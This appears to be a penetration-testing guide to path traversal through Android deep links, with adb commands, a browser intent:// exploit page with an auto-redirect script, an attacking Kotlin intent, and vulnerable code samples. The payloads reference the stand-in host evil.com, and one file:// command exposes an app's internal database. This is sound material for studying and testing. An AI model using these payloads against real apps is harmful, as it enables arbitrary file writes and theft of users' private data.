# Deep Link Path Traversal Attacks

## Overview

Android deep links (intent filters with VIEW action + data schemes) are a common attack surface. When apps download or save files based on URI components without sanitization, path traversal enables writing to arbitrary app-writable locations.

## URI Parsing Behavior

### Android Uri.getLastPathSegment()

```
URI: https://evil.com/a/b/..%2F..%2Fsecret%2Ffile.txt
Path: /a/b/..%2F..%2Fsecret%2Ffile.txt
Segments (split on /): ["a", "b", "..%2F..%2Fsecret%2Ffile.txt"]
getLastPathSegment(): "../../secret/file.txt"  (decoded!)
```

Key behavior:
- Path is split on literal `/` FIRST
- Then each segment is percent-decoded
- `%2F` in a segment becomes `/` in the returned value
- This `/` is NOT treated as a path separator by Uri — but IS by `java.io.File`

### java.net.URL vs android.net.Uri

| Method | Decodes %2F? | Splits on decoded /? |
|--------|-------------|---------------------|
| `Uri.getLastPathSegment()` | Yes | No (splits before decoding) |
| `Uri.getPath()` | Yes | N/A (returns full path) |
| `URL.getPath()` | No | N/A |
| `URL.getFile()` | No | N/A |

### Exploit Implications

When `getLastPathSegment()` result is used in `new File(base, segment)`:
- The decoded `/` characters act as path separators
- `..` sequences traverse directories
- The file is written outside the intended base directory

## Deep Link Trigger Methods

### From ADB (Testing)

```bash
# Direct intent
adb shell am start -a android.intent.action.VIEW \
  -t "application/pdf" \
  -d "http://evil.com/x/..%2F..%2Fpayload" \
  <package>

# With explicit component
adb shell am start -n <package>/.MainActivity \
  -a android.intent.action.VIEW \
  -t "application/pdf" \
  -d "http://evil.com/x/..%2F..%2Fpayload"
```

### From Browser (Real Attack)

```html
<!-- Intent URI (Chrome, most Android browsers) -->
<a href="intent://evil.com/x/..%2F..%2Fpayload#Intent;scheme=https;type=application/pdf;package=com.target.app;end">
  Open Document
</a>

<!-- Auto-redirect -->
<script>
window.location = "intent://evil.com/x/..%2F..%2Fpayload#Intent;scheme=https;type=application/pdf;package=com.target.app;end";
</script>
```

### From Another App (Local)

```kotlin
val intent = Intent(Intent.ACTION_VIEW).apply {
    data = Uri.parse("http://evil.com/x/..%2F..%2Fpayload")
    type = "application/pdf"
    setPackage("com.target.app")
}
startActivity(intent)
```

## Common Vulnerable Patterns

### Pattern 1: Download + Save with URI Filename

```kotlin
// Intent filter: http/https scheme + some mimeType
fun handleDeepLink(uri: Uri) {
    val filename = uri.lastPathSegment ?: "default.pdf"  // VULNERABLE
    val outFile = File(downloadsDir, filename)
    downloadFromUrl(uri.toString(), outFile)
}
```

### Pattern 2: Content Provider File Access

```kotlin
// Exported content provider serving files
override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor {
    val filename = uri.lastPathSegment  // VULNERABLE
    val file = File(dataDir, filename)
    return ParcelFileDescriptor.open(file, MODE_READ_ONLY)
}
```

### Pattern 3: ZIP Extraction (ZipSlip)

```kotlin
// Extracting ZIP from deep link
zipFile.entries().asSequence().forEach { entry ->
    val outFile = File(extractDir, entry.name)  // VULNERABLE if entry.name has ../
    outFile.outputStream().use { zipFile.getInputStream(entry).copyTo(it) }
}
```

## file:// Scheme Attacks

When an app's intent filter includes `file://` scheme:

### Local File Disclosure

```bash
# Copy app's internal file to world-readable external storage
adb shell am start -a android.intent.action.VIEW \
  -t "application/pdf" \
  -d "file:///data/data/com.target.app/databases/secrets.db" \
  com.target.app
```

If the app copies the file to external storage (e.g., Downloads), any app can read it.

### Local File Inclusion

```bash
# Make app process a malicious local file
adb shell am start -a android.intent.action.VIEW \
  -t "application/pdf" \
  -d "file:///sdcard/Download/malicious.pdf" \
  com.target.app
```

## Testing Methodology

### 1. Identify Deep Link Handlers

```bash
# From AndroidManifest.xml
grep -A 10 "android.intent.action.VIEW" AndroidManifest.xml
# Look for: scheme (http, https, file, content, custom)
# Look for: mimeType, pathPattern, host restrictions
```

### 2. Trace Data Flow

Follow the URI from `getIntent().getData()` through:
- `uri.getLastPathSegment()` → filename
- `uri.getPath()` → path component
- `uri.toString()` → full URL for download
- `uri.getQueryParameter()` → query params

### 3. Test Path Traversal

```bash
# Basic traversal
adb shell am start -a android.intent.action.VIEW -t "application/pdf" \
  -d "http://evil.com/x/..%2F..%2Ftest.txt" <pkg>

# Check where file landed
adb shell "find /sdcard/Download /data/data/<pkg> -name test.txt -newer /tmp/marker 2>/dev/null"
```

### 4. Verify Write Location

```bash
# Pre-grant permissions to avoid dialogs
adb shell pm grant <pkg> android.permission.READ_EXTERNAL_STORAGE
adb shell pm grant <pkg> android.permission.WRITE_EXTERNAL_STORAGE
adb shell appops set --uid <pkg> MANAGE_EXTERNAL_STORAGE allow

# Monitor filesystem changes
adb shell inotifywait -r /data/data/<pkg>/files/ 2>/dev/null &
# Then trigger deep link
```

## Mitigation Verification

After the developer applies fixes, verify:

```bash
# Should fail (file stays in intended directory)
adb shell am start -a android.intent.action.VIEW -t "application/pdf" \
  -d "http://evil.com/x/..%2F..%2F..%2F..%2Fdata%2Fdata%2F<pkg>%2Ffiles%2Ftest" <pkg>

# Check: file should NOT exist at traversed path
adb shell "run-as <pkg> ls /data/data/<pkg>/files/test" && echo "STILL VULNERABLE" || echo "FIXED"
```

## ADB Tips for Deep Link Testing

| Issue | Solution |
|-------|----------|
| "Activity not started, delivered to running instance" | Use `am start -S` to force-stop first |
| Permission dialog blocks flow | Pre-grant with `pm grant` + `appops set` |
| App crashes on malformed URI | Check logcat: `adb logcat -d \| grep -i "exception\|crash"` |
| Download doesn't complete | Wait longer, check network: `adb shell ping <host_ip>` |
| Can't verify internal storage | Use `run-as` (debuggable) or root |
